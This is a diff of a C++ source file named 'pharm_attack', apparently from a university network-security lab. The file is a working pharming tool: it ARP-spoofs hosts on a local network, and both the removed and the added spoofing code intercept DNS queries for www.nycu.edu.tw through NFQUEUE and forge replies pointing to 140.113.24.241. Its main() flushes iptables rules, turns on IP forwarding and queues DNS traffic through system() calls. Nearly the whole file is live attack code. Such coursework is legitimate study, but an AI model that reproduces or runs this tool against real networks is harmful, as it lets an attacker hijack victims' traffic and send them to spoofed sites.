@@ -1,7 +1,7 @@
 #include "pharm_attack.hpp"
 
 // #define INFO 1
-// #define NFQ 1
+#define NFQ 1
 #define MAC_LENGTH 6
 
 #ifdef NFQ
@@ -11,180 +11,171 @@ void handler(int signum) {
 }
 #endif
 
-uint16_t computeChecksum(const std::vector<unsigned char> &buffer) {
-    uint32_t sum = 0;
-    for (size_t i = 0; i < buffer.size() - 1; i += 2) {
-        sum += (buffer[i] << 8) + buffer[i + 1];
-    }
-    if (buffer.size() & 1) {
-        sum += buffer[buffer.size() - 1] << 8;
-    }
-    while (sum >> 16) {
-        sum = (sum & 0xFFFF) + (sum >> 16);
-    }
-    return ~sum;
-}
-
-/*
-Modify the source MAC address to the attacker to let the receiver think the packet is from the attacker
-Change the destination MAC address of the packet to the corresponding MAC address in the map
-*/
-bool modifyPacket(uint8_t *buffer, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
-    // Get the Ethernet header
-    struct ethhdr *eth = (struct ethhdr *)buffer;
-
-    // Get the IP header
-    struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);
-
-    bool modified = false;
-
-    // Change the source MAC to my MAC
-    memcpy(eth->h_source, local_info.src_mac.data(), ETH_ALEN);
-
-    // If the destination IP is not in the map, change the destination MAC to the gateway's MAC
-    if (ip_mac_pairs.find({(uint8_t)(iph->daddr & 0xff), (uint8_t)((iph->daddr >> 8) & 0xff), (uint8_t)((iph->daddr >> 16) & 0xff), (uint8_t)((iph->daddr >> 24) & 0xff)}) == ip_mac_pairs.end()) {
-        // Find the MAC address for the gateway IP
-        std::array<uint8_t, 4> gateway_ip_addr = {(uint8_t)(local_info.gateway_ip.sin_addr.s_addr & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 8) & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 16) & 0xff), (uint8_t)((local_info.gateway_ip.sin_addr.s_addr >> 24) & 0xff)};
-        std::array<uint8_t, 6> &gateway_mac = ip_mac_pairs[gateway_ip_addr];
-        memcpy(eth->h_dest, gateway_mac.data(), ETH_ALEN);
-        modified = true;
-    }
-    // If the destination MAC is my_mac and the IP is not my IP, change the destination MAC to the IP's MAC
-    if (memcmp(eth->h_dest, local_info.src_mac.data(), ETH_ALEN) != 0 && iph->daddr != local_info.src_ip.sin_addr.s_addr && !modified) {
-        // Find the MAC address for the destination IP
-        std::array<uint8_t, 4> dest_ip_addr;
-        memcpy(dest_ip_addr.data(), &iph->daddr, 4);
-        std::array<uint8_t, 6> &dest_mac = ip_mac_pairs[dest_ip_addr];
-        memcpy(eth->h_dest, dest_mac.data(), ETH_ALEN);
-        modified = true;
-    }
-    return modified;
-}
-
-void sendMarkedPacket(uint8_t *buffer, int bytes, int sd, struct LocalInfo local_info) {
-    // Get the payload
-    uint8_t *payload = buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr);
-    int payload_length = bytes - (ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct tcphdr));
-
-    int chunk_size = 1024;  // Size of each chunk
-    int total_sent = 0;     // Total amount of data sent
-    while (total_sent < bytes) {
-        int to_send = std::min(chunk_size, bytes - total_sent);
-        if (sendto(sd, buffer + total_sent, to_send, 0, (struct sockaddr *)&local_info.device, sizeof(local_info.device)) <= 0) {
-            perror("sendto() failed (Packet)");
-            exit(EXIT_FAILURE);
-        }
-        total_sent += to_send;
-    }
-}
-
-void send_dns_response(int payload_size, char *response_packet, uint32_t dst_ip, uint16_t dst_port, struct LocalInfo localinfo) {
-    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-    if (fd == -1) {
-        perror("send_dns_response socket error");
+void send_data_udp(char *data, int len, struct NFQData *info) {
+    // raw socket
+    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
+    // int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd < 0) {
+        perror("socket()");
         return;
+    }
+
+    uint32_t my_ip = info->local_info.src_ip.sin_addr.s_addr;
+    int ifidx = info->local_info.device.sll_ifindex;
+    std::array<uint8_t, 6> src_mac = info->local_info.src_mac;
+    unsigned char my_mac[6];
+    std::copy(src_mac.begin(), src_mac.end(), my_mac);
+    // dump ifidx, src_mac, my_ip
+    printf("ifidx: %d\n", ifidx);
+    printf("src_mac: ");
+    for (int i = 0; i < 6; i++) {
+        printf("%02x ", my_mac[i]);
+    }
+    printf("\n");
+    printf("my_ip: %s\n", inet_ntoa(info->local_info.src_ip.sin_addr));
+    
+    char *sendbuf = new char[1024];
+    memset(sendbuf, 0, 1024);
+    struct ethhdr *eth = (struct ethhdr *)sendbuf;
+    std::array<uint8_t, 4> dest_ip_array;
+    for (int i = 0; i < 4; i++) {
+        dest_ip_array[i] = data[16 + i];
+    }
+
+    memcpy(eth->h_source, my_mac, MAC_LENGTH);
+
+    unsigned char *dest_mac = new unsigned char[6];
+    auto it = info->ip_mac_pairs.find(dest_ip_array);
+    if (it != info->ip_mac_pairs.end()) {
+        std::copy(it->second.begin(), it->second.end(), dest_mac);
+        // Now dest_mac contains the MAC address for dest_ip_array
+    } else {
+        // Handle the case where dest_ip_array is not in the map
+        // Print destination IP
+        printf("Destination IP: %d.%d.%d.%d not found in map\n", dest_ip_array[0], dest_ip_array[1], dest_ip_array[2], dest_ip_array[3]);
+        return;
+    }
+    memcpy(eth->h_dest, dest_mac, MAC_LENGTH);
+    eth->h_proto = htons(ETH_P_IP);
+
+    for (int i = ETH2_HEADER_LEN; i < len + ETH2_HEADER_LEN; i++) {
+        sendbuf[i] = data[i - ETH2_HEADER_LEN];
+    }
+
+    // dump
+    // for(int i=0;i<len+ETH2_HEADER_LEN;i++){
+    //     cout << hex << (unsigned)sendbuf[i] << ' ';
+    //     if(i%16 == 15) cout << '\n';
+    // }
+    // cout << '\n';
+
+    struct sockaddr_ll sll;
+    memset(&sll, 0, sizeof(struct sockaddr_ll));
+    sll.sll_family = AF_PACKET;
+    sll.sll_ifindex = ifidx;
+    if (bind(fd, (struct sockaddr *)&sll, sizeof(struct sockaddr_ll)) < 0) {
+        perror("bind");
     }
 
     struct sockaddr_ll socket_address;
     socket_address.sll_family = AF_PACKET;
-    socket_address.sll_protocol = htons(ETH_P_ALL);
-    socket_address.sll_ifindex = localinfo.device.sll_ifindex;
+    socket_address.sll_protocol = htons(ETH_P_IP);
+    socket_address.sll_ifindex = ifidx;
     socket_address.sll_hatype = htons(ARPHRD_ETHER);
-    socket_address.sll_pkttype = PACKET_OTHERHOST;
+    socket_address.sll_pkttype = (PACKET_BROADCAST);
     socket_address.sll_halen = MAC_LENGTH;
     socket_address.sll_addr[6] = 0x00;
     socket_address.sll_addr[7] = 0x00;
+    memcpy(socket_address.sll_addr, my_mac, MAC_LENGTH);
 
-    ssize_t ret = sendto(fd, response_packet, payload_size, 0, (struct sockaddr *)&socket_address, sizeof(socket_address));
-    if (ret == -1) {
-        perror("send_dns_response sendto error");
-        close(fd);
-        return;
+    if (sendto(fd, sendbuf, len + ETH2_HEADER_LEN, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+        perror("sendto()");
     }
-
     close(fd);
+    delete[] sendbuf;
+    delete[] data;
+
+    return;
 }
 
-void makeSpoofedDNSResponse(uint8_t *buffer, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, struct LocalInfo local_info) {
-    struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);
-    struct udphdr *udph = (struct udphdr *)(buffer + ETH_HDRLEN + sizeof(struct iphdr));
-    struct dnshdr *dnsh = (struct dnshdr *)(buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct udphdr));
-    struct dns_query *dnsq = (struct dns_query *)(buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
-    char *domain = (char *)(buffer + ETH_HDRLEN + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
-
-    char response_packet[2048];
-    memset(response_packet, 0, 2048);
-    int payload_size = 0;
-    std::string spoofed_site = "www.nycu.edu.tw";
-    std::string target_ip = "140.113.24.241";
-
-    // Make the response packet
-    // DNS response header
-    char *dns_response_hdr = (char *)(response_packet + ETH_HLEN + iph->ihl * 4 + sizeof(udphdr));
-    memcpy(dns_response_hdr, dnsh->id, 2);
-    memcpy(dns_response_hdr + 2, "\x81\x80", 2);   // Response, Recursion Desired, Recursion Available
-    memcpy(dns_response_hdr + 4, "\x00\x01", 2);   // Question count
-    memcpy(dns_response_hdr + 6, "\x00\x01", 2);   // Answer RR count
-    memcpy(dns_response_hdr + 8, "\x00\x00", 2);   // Authority RR count
-    memcpy(dns_response_hdr + 10, "\x00\x00", 2);  // Additional RR count
-    payload_size += sizeof(dnshdr);
-
-    // DNS response query
-    char *dns_response_query = (char *)(response_packet + ETH_HLEN + iph->ihl * 4 + sizeof(udphdr) + sizeof(dnshdr));
-    memcpy(dns_response_query, dnsq, spoofed_site.size() + 2);                // the original query
-    memcpy(dns_response_query + spoofed_site.size() + 2, "\x00\x01", 2);      // type A
-    memcpy(dns_response_query + spoofed_site.size() + 2 + 2, "\x00\x01", 2);  // class IN
-    payload_size += spoofed_site.size() + 2 + 4;
-
-    // DNS response answer
-    char *dns_response_answer = (char *)(response_packet + ETH_HLEN + iph->ihl * 4 + sizeof(udphdr) + payload_size);
-    memcpy(dns_response_answer, "\xc0\x0c", 2);              // pointer to the domain name
-    memcpy(dns_response_answer + 2, "\x00\x01", 2);          // type A
-    memcpy(dns_response_answer + 4, "\x00\x01", 2);          // class IN
-    memcpy(dns_response_answer + 6, "\x00\x00\x00\x3c", 4);  // TTL
-    memcpy(dns_response_answer + 10, "\x00\x04", 2);         // data length
-    for (int i = 0; i < 4; i++) {
-        std::string ip = target_ip.substr(0, target_ip.find("."));
-        target_ip = target_ip.substr(target_ip.find(".") + 1);
-        dns_response_answer[12 + i] = stoi(ip);
+void send_dns_reply(unsigned char *payload, int len, int qlen, struct NFQData *info) {
+    char *data = new char[1024];
+    for (int i = 0; i < len; i++) {
+        data[i] = payload[i];
     }
 
-    payload_size += 16;
+    // for revising ip header total length and checksum
+    struct ip_hdr *iph = (struct ip_hdr *)data;
+    int iph_len = (((uint8_t)data[0]) & 0x0F) << 2, udph_len = 8;
+    iph->flags = 0;
+    uint tmp = iph->src_ip;
+    iph->src_ip = iph->dst_ip;
+    iph->dst_ip = tmp;
 
-    // ip, udp header
-    struct iphdr *ip_response = (struct iphdr *)(response_packet + ETH_HLEN);
-    ip_response->ihl = 5;
-    ip_response->version = 4;
-    ip_response->tos = 0;
-    ip_response->tot_len = htons(20 + 8 + payload_size);
-    ip_response->id = htons(0);
-    ip_response->frag_off = 0;
-    ip_response->ttl = 64;
-    ip_response->protocol = IPPROTO_UDP;
-    ip_response->check = 0;
-    ip_response->saddr = iph->daddr;
-    ip_response->daddr = iph->saddr;
-    ip_response->check = htons(computeChecksum(std::vector<unsigned char>(response_packet + ETH_HLEN, response_packet + ETH_HLEN + ip_response->ihl * 4)));
-    payload_size += 20;
+    // for revising udp header length and checksum
+    struct udp_hdr *udph = (struct udp_hdr *)(data + iph_len);
+    udph->dst_port = udph->src_port;
+    udph->src_port = htons(53);
 
-    struct udphdr *udp_response = (struct udphdr *)(response_packet + ETH_HLEN + iph->ihl * 4);
-    udp_response->source = htons(53);
-    udp_response->dest = udph->source;
-    udp_response->len = htons(8 + payload_size - 20);
-    udp_response->check = 0;
-    payload_size += 8;
+    // for revising dns response content
+    struct dns_hdr *new_hdr = (struct dns_hdr *)(data + iph_len + udph_len);
 
-    // ethernet header
-    struct ether_header *eth_response = (struct ether_header *)response_packet;
-    // destination mac: victim's mac
-    memcpy(eth_response->ether_dhost, buffer + ETH_ALEN, ETH_ALEN);
-    // source mac: my mac
-    memcpy(eth_response->ether_shost, local_info.src_mac.data(), ETH_ALEN);
-    eth_response->ether_type = htons(ETH_P_IP);
-    payload_size += ETH_HLEN;
+    new_hdr->flags = htons(0x8180);
+    // only 1 answer in reply (140.113.24.241)
+    new_hdr->ans_cnt = htons(1);
+    new_hdr->authrr_cnt = htons(0);
+    new_hdr->addrr_cnt = htons(0);
 
-    // Send the packet
-    send_dns_response(payload_size, response_packet, iph->saddr, ntohs(udph->source), local_info);
+    int resp_mv = iph_len + udph_len + sizeof(struct dns_hdr) + qlen;
+    struct resp_hdr *resp = (struct resp_hdr *)(data + resp_mv);
+    resp->name = htons(0xc00c);  // compress name
+    resp->type = htons(1);       // A record
+    resp->cls = htons(1);        // IN internet
+    resp->ttl = htonl(5);
+    resp->len = htons(4);
+    resp_mv += sizeof(struct resp_hdr);
+    data[resp_mv] = 140;
+    data[resp_mv + 1] = 113;
+    data[resp_mv + 2] = 24;
+    data[resp_mv + 3] = 241;
+    resp_mv += 4;
+
+    // checksum calculation
+    // reference: https://bruce690813.blogspot.com/2017/09/tcpip-checksum.html
+    udph->len = htons(resp_mv - iph_len);
+    udph->checksum = 0;
+    // calculate udp checksum
+    uint32_t sum = 0;
+    // pseudo header
+    sum += ntohs(iph->src_ip >> 16) + ntohs(iph->src_ip & 0xFFFF);
+    sum += ntohs(iph->dst_ip >> 16) + ntohs(iph->dst_ip & 0xFFFF);
+    sum += 0x0011;  // UDP
+    sum += (resp_mv - iph_len);
+    auto buf = reinterpret_cast<const uint16_t *>(udph);
+    int len_buf = (resp_mv - iph_len) % 2 ? (resp_mv - iph_len) / 2 + 1 : (resp_mv - iph_len) / 2;
+    for (int i = 0; i < len_buf; i++) {
+        sum += ntohs(buf[i]);
+    }
+    while (sum >> 16) {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+    udph->checksum = ~htons(sum);
+
+    // calculate ip checksum
+    iph->tlen = htons(resp_mv);
+    iph->checksum = 0;
+    sum = 0;
+    buf = reinterpret_cast<const uint16_t *>(iph);
+    for (int i = 0; i < iph->ihl * 2; i++) {
+        sum += ntohs(buf[i] & 0xFFFF);
+    }
+    while (sum >> 16) {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+    iph->checksum = ~htons(sum);
+
+    // send data out
+    send_data_udp(data, resp_mv, info);
 }
 
 // Function to handle receiving responses
@@ -204,56 +195,9 @@ void receiveHandler(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t,
         // Check if packet is an ARP packet
         if (buffer[12] == ETH_P_ARP / 256 && buffer[13] == ETH_P_ARP % 256) {
             parseARPReply(buffer, ip_mac_pairs, local_info);
-            continue;
         }
-        // Check if packet is an IP packet
-        if (bytes < ETH_HDRLEN + sizeof(struct iphdr)) {
-            continue;  // Not enough data for IP header
-        }
-        struct iphdr *iph = (struct iphdr *)(buffer + ETH_HDRLEN);  // Skip the Ethernet header
-        if (iph->daddr == htonl(0x7f000001) || iph->saddr == htonl(0x7f000001)) {
-            continue;
-        }
-
-        modifyPacket(buffer, ip_mac_pairs, local_info);
-
-        // Skip non-UDP packets
-        if (iph->protocol != IPPROTO_UDP) {
-            sendMarkedPacket(buffer, bytes, sd, local_info);
-            continue;
-        }
-
-        struct udphdr *udph = (struct udphdr *)(buffer + ETH_HDRLEN + iph->ihl * 4);
-
-        // Check if the destination port is 53 (DNS Packet)
-        if (ntohs(udph->dest) != 53) {
-            sendMarkedPacket(buffer, bytes, sd, local_info);
-            continue;
-        }
-        char response_packet[2048];
-        memset(response_packet, 0, 2048);
-        int payload_size = 0;
-        std::string spoofed_site = "wwwnycuedutw";
-        std::string target_ip = "140.113.24.241";
-        struct dnshdr *dnsh = (struct dnshdr *)(ETH_HDRLEN + buffer + iph->ihl * 4 + sizeof(struct udphdr));
-        struct dns_query *dnsq = (struct dns_query *)(ETH_HDRLEN + buffer + iph->ihl * 4 + sizeof(struct udphdr) + sizeof(struct dnshdr));
-        char *domain = (char *)(ETH_HDRLEN + buffer + iph->ihl * 4 + sizeof(struct udphdr) + sizeof(struct dnshdr));
-        printf("Domain: %s\n", domain);
-        // Check if the domain is the spoofed site
-        if (strcmp(domain, spoofed_site.c_str()) != 0) {
-            sendMarkedPacket(buffer, bytes, sd, local_info);
-            continue;
-        }
-        if (!(domain[spoofed_site.size() + 2] == 0x00 && domain[spoofed_site.size() + 3] == 0x01 && domain[spoofed_site.size() + 4] == 0x00 && domain[spoofed_site.size() + 5] == 0x01)) {
-            sendMarkedPacket(buffer, bytes, sd, local_info);
-            continue;
-        }
-
-        printf("Found the spoof target!!!\n");
-        // Make the response packet
-        makeSpoofedDNSResponse(buffer, ip_mac_pairs, local_info);
-
         memset(buffer, 0, IP_MAXPACKET);
+        continue;
     }
 }
 
@@ -262,6 +206,8 @@ static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
     struct nfqnl_msg_packet_hdr *ph;
     struct nfqnl_msg_packet_hw *hwph;
     u_int32_t id = 0;
+    struct NFQData *nfq_data = (struct NFQData *)data;
+
     ph = nfq_get_msg_packet_hdr(nfa);
     if (ph) {
         id = ntohl(ph->packet_id);
@@ -272,58 +218,51 @@ static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
         printf("Error: nfq_get_payload returned %d\n", len);
         return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
     }
-    // Parse the packet
-    struct iphdr *iph = (struct iphdr *)packet;
 
-    // Skip local
-    if (iph->daddr == htonl(0x7f000001) || iph->saddr == htonl(0x7f000001)) {
-        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
-    }
+    // udp
+    int dport;
+    int iph_len = (((uint8_t)packet[0]) & 0x0F) << 2, udph_len = 8;
+    dport = (((uint8_t)packet[iph_len + 2]) << 8) | ((uint8_t)packet[iph_len + 3]);
 
-    // Skip non-UDP packets
-    if (iph->protocol != IPPROTO_UDP) {
-        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
-    }
+    if (dport == 53) {
+        std::string str = "";
+        int dns_start = iph_len + udph_len;
+        // struct dns_hdr *hdr = (struct dns_hdr *) (data + dns_start);
 
-    // Print source and destination IP addresses
-    printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
-    printf("Destination IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->daddr));
+        int name_mv = dns_start + sizeof(dns_hdr);
+        int qname_len = 5;  // qry.type and qry.class, and final 0 in qname
+        while (packet[name_mv] != 0) {
+            int part_len = packet[name_mv];
+            qname_len += part_len + 1;
+            // cout << "len: " << part_len << '\n';
+            for (int j = 0; j < part_len; j++) {
+                name_mv++;
+                str += packet[name_mv];
+            }
+            name_mv++;
+            str += '.';
+        }
 
-    struct udphdr *udph = (struct udphdr *)(packet + iph->ihl * 4);
-
-    // Check if the destination port is 53 (DNS Packet)
-    if (ntohs(udph->dest) != 53) {
-        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
-    }
-
-    char response_packet[2048];
-    memset(response_packet, 0, 2048);
-    int payload_size = 0;
-    std::string spoofed_site = "www.nycu.edu.tw";
-    std::string target_ip = "140.113.24.241";
-    struct dnshdr *dnsh = (struct dnshdr *)(packet + iph->ihl * 4 + sizeof(struct udphdr));
-    struct dns_query *dnsq = (struct dns_query *)(packet + iph->ihl * 4 + sizeof(struct udphdr) + sizeof(struct dnshdr));
-    char *domain = (char *)(packet + iph->ihl * 4 + sizeof(struct udphdr) + sizeof(struct dnshdr));
-    printf("Domain: %s\n", domain);
-    // Check if the domain is the spoofed site
-    if (strcmp(domain, spoofed_site.c_str()) != 0) {
-        printf("Not the spoofed site\n");
-        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
-    }
-    if (!(domain[spoofed_site.size() + 2] == 0x00 && domain[spoofed_site.size() + 3] == 0x01 && domain[spoofed_site.size() + 4] == 0x00 && domain[spoofed_site.size() + 5] == 0x01)) {
-        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+        if (str.find("www.nycu.edu.tw") != std::string::npos) {
+            printf("target found!!!\n");
+            send_dns_reply(packet, len, qname_len, nfq_data);
+        }
     }
 
     return nfq_set_verdict(qh, ph->packet_id, NF_DROP, 0, NULL);
 }
 
-void NFQHandler() {
+void NFQHandler(struct LocalInfo local_info, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs) {
     struct nfq_handle *h;
     struct nfq_q_handle *qh;
     struct nfnl_handle *nh;
     int fd;
     int rv;
     char buf[4096] __attribute__((aligned));
+
+    struct NFQData nfq_data;
+    nfq_data.local_info = local_info;
+    nfq_data.ip_mac_pairs = ip_mac_pairs;
 
     h = nfq_open();
     if (!h) {
@@ -338,7 +277,7 @@ void NFQHandler() {
         fprintf(stderr, "error during nfq_bind_pf()\n");
         exit(1);
     }
-    qh = nfq_create_queue(h, 0, &handleNFQPacket, NULL);
+    qh = nfq_create_queue(h, 0, &handleNFQPacket, &nfq_data);
     if (!qh) {
         fprintf(stderr, "error during nfq_create_queue()\n");
         exit(1);
@@ -397,7 +336,7 @@ int main(int argc, char **argv) {
 #endif
 
     // Submit request for a raw socket descriptor.
-    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
+    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
         perror("socket() failed");
         exit(EXIT_FAILURE);
     }
@@ -417,11 +356,19 @@ int main(int argc, char **argv) {
     std::thread receive_thread(receiveHandler, sd, std::ref(ip_mac_pairs), local_info);
 
 #ifdef NFQ
-    system("sudo iptables -t mangle -A OUTPUT -j NFQUEUE --queue-num 0");
-    signal(SIGINT, handler);
+    system("sysctl net.ipv4.ip_forward=1 > /dev/null");
+    // system("sysctl net.ipv4.conf.all.send_redirects=0 > /dev/null");
+    // system("sysctl net.ipv4.conf.all.secure_redirects=0 > /dev/null");
+    system("iptables -F");
+    system("iptables -F -t nat");
+    char cmd[100];
+    sprintf(cmd, "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", interface);
+    system(cmd);
+    system("iptables -A FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0");
+    system("iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0");
 
     // Start the NFQHandler
-    NFQHandler();
+    NFQHandler(local_info, ip_mac_pairs);
 #endif
 
     // Wait for threads to finish
